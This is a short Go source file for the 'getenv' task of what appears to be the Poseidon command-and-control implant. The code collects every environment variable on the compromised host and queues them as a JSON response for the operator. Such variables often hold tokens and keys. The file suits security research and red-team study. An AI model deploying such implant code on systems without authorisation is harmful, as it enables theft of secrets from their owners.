package getenv

import (
	"encoding/json"
	"os"
	"strings"
	"sync"

	"github.com/xorrior/poseidon/pkg/profiles"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var mu sync.Mutex

//Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	msg.UserOutput = strings.Join(os.Environ(), "\n")
	msg.Completed = true

	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
